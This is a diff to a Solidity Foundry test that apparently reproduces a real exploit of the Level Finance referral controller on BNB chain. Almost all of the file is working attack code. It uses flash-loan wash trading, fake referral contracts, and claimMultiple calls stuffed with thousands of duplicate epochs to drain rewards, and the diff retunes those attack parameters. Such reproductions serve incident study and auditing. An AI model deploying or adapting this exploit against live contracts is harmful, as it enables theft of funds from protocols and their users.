@@ -14,7 +14,13 @@ import "./interface.sol";
 // Lack of checking for duplicate elements in arrays
 
 interface IPool {
-    function swap(address _tokenIn, address _tokenOut, uint256 _minOut, address _to, bytes calldata extradata) external;
+    function swap(
+        address _tokenIn,
+        address _tokenOut,
+        uint256 _minOut,
+        address _to,
+        bytes calldata extradata
+    ) external;
 }
 
 interface ILevelReferralControllerV2 {
@@ -24,11 +30,12 @@ interface ILevelReferralControllerV2 {
         uint256 referralPoint;
         uint256 claimed;
     }
+
     function claim(uint256 _epoch, address _to) external;
     function claimMultiple(uint256[] calldata _epoches, address _to) external;
     function setReferrer(address _referrer) external;
-    function currentEpoch() external view returns(uint256);
-    function claimable(uint256 _epoch, address _user) public view returns (uint256);
+    function currentEpoch() external view returns (uint256);
+    function claimable(uint256 _epoch, address _user) external view returns (uint256);
     function setEnableNextEpoch(bool _enable) external;
     function nextEpoch() external;
 }
@@ -37,7 +44,8 @@ contract ContractTest is Test {
     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IERC20 LVL = IERC20(0xB64E280e9D1B5DbEc4AcceDb2257A87b400DB149);
-    ILevelReferralControllerV2 LevelReferralControllerV2 = ILevelReferralControllerV2(0x977087422C008233615b572fBC3F209Ed300063a);
+    ILevelReferralControllerV2 LevelReferralControllerV2 =
+        ILevelReferralControllerV2(0x977087422C008233615b572fBC3F209Ed300063a);
     IPool pool = IPool(0xA5aBFB56a78D2BD4689b25B8A77fd49Bb0675874);
     address dodo = 0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d;
     Exploiter exploiter;
@@ -45,7 +53,7 @@ contract ContractTest is Test {
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("bsc", 27830139);
+        cheats.createSelectFork("bsc", 27_830_139);
         cheats.label(address(WBNB), "WBNB");
         cheats.label(address(USDT), "USDT");
         cheats.label(address(LVL), "LVL");
@@ -60,17 +68,17 @@ contract ContractTest is Test {
         LevelReferralControllerV2.setReferrer(address(exploiter));
         createReferral();
         WashTrading();
-        vm.warp(block.timestamp + 604801);
+        vm.warp(block.timestamp + 1 * 60 * 60);
         vm.startPrank(0x6023C6afa26a68E05672F111FdbB1De93cBAc621);
         LevelReferralControllerV2.setEnableNextEpoch(true);
         LevelReferralControllerV2.nextEpoch();
         vm.stopPrank();
-        vm.warp(block.timestamp + 604801 + 1 * 60 * 60);
+        vm.warp(block.timestamp + 60 * 60);
         claim();
-        vm.warp(block.timestamp + 604801 + 4 * 60 * 60);
-        for(uint i; i < 1; i++) {
-            claimReward(2);
-            vm.warp(block.timestamp + 604801 + 4 * 60 * 60 + i * 60);
+        vm.warp(block.timestamp + 5 * 60 * 60);
+        for (uint256 i; i < 11; i++) {
+            claimReward(2000);
+            vm.warp(block.timestamp + i * 15);
         }
 
         emit log_named_decimal_uint(
@@ -79,10 +87,10 @@ contract ContractTest is Test {
     }
 
     function createReferral() internal {
-        for(uint i; i < 15; i++){
+        for (uint256 i; i < 15; i++) {
             new Referral(address(exploiter));
         }
-        for(uint i; i < 15; i++){
+        for (uint256 i; i < 15; i++) {
             new Referral(address(this));
         }
     }
@@ -93,7 +101,7 @@ contract ContractTest is Test {
 
     function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
         uint256 amount = abi.decode(data, (uint256));
-        for(uint i; i < amount; i++) {
+        for (uint256 i; i < amount; i++) {
             WBNB.transfer(address(pool), WBNB.balanceOf(address(this)));
             pool.swap(address(WBNB), address(USDT), 1, address(this), abi.encode(address(exploiter)));
             USDT.transfer(address(pool), USDT.balanceOf(address(this)));
@@ -105,6 +113,7 @@ contract ContractTest is Test {
     }
 
     function claim() internal {
+        LevelReferralControllerV2.claimable(13, address(this));
         uint256 tokenID = LevelReferralControllerV2.currentEpoch() - 1;
         LevelReferralControllerV2.claim(tokenID, address(this));
         exploiter.claim(tokenID);
@@ -113,10 +122,10 @@ contract ContractTest is Test {
     function claimReward(uint256 amount) internal {
         uint256 tokenID = LevelReferralControllerV2.currentEpoch() - 1;
         uint256[] memory _epoches = new uint256[](amount);
-        for(uint i; i < amount; i++) {
+        for (uint256 i; i < amount; i++) {
             _epoches[i] = tokenID;
         }
-        // LevelReferralControllerV2.claimable(_epoches[0], _user);
+        LevelReferralControllerV2.claimable(_epoches[0], address(this));
         LevelReferralControllerV2.claimMultiple(_epoches, address(this));
         exploiter.claimMultiple(amount);
     }
@@ -126,13 +135,15 @@ contract Exploiter {
     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IPool pool = IPool(0xA5aBFB56a78D2BD4689b25B8A77fd49Bb0675874);
-    ILevelReferralControllerV2 LevelReferralControllerV2 = ILevelReferralControllerV2(0x977087422C008233615b572fBC3F209Ed300063a);
+    ILevelReferralControllerV2 LevelReferralControllerV2 =
+        ILevelReferralControllerV2(0x977087422C008233615b572fBC3F209Ed300063a);
+
     constructor(address _referrer) {
         LevelReferralControllerV2.setReferrer(_referrer);
     }
 
     function swap(uint256 amount) external {
-        for(uint i; i < amount; i++) {
+        for (uint256 i; i < amount; i++) {
             WBNB.transfer(address(pool), WBNB.balanceOf(address(this)));
             pool.swap(address(WBNB), address(USDT), 1, address(this), abi.encode(address(msg.sender)));
             USDT.transfer(address(pool), USDT.balanceOf(address(this)));
@@ -148,16 +159,17 @@ contract Exploiter {
     function claimMultiple(uint256 amount) external {
         uint256 tokenID = LevelReferralControllerV2.currentEpoch() - 1;
         uint256[] memory _epoches = new uint256[](amount);
-        for(uint i; i < amount; i++) {
+        for (uint256 i; i < amount; i++) {
             _epoches[i] = tokenID;
         }
         LevelReferralControllerV2.claimMultiple(_epoches, msg.sender);
     }
-
 }
 
 contract Referral {
-    ILevelReferralControllerV2 LevelReferralControllerV2 = ILevelReferralControllerV2(0x977087422C008233615b572fBC3F209Ed300063a);
+    ILevelReferralControllerV2 LevelReferralControllerV2 =
+        ILevelReferralControllerV2(0x977087422C008233615b572fBC3F209Ed300063a);
+
     constructor(address _referrer) {
         LevelReferralControllerV2.setReferrer(_referrer);
     }
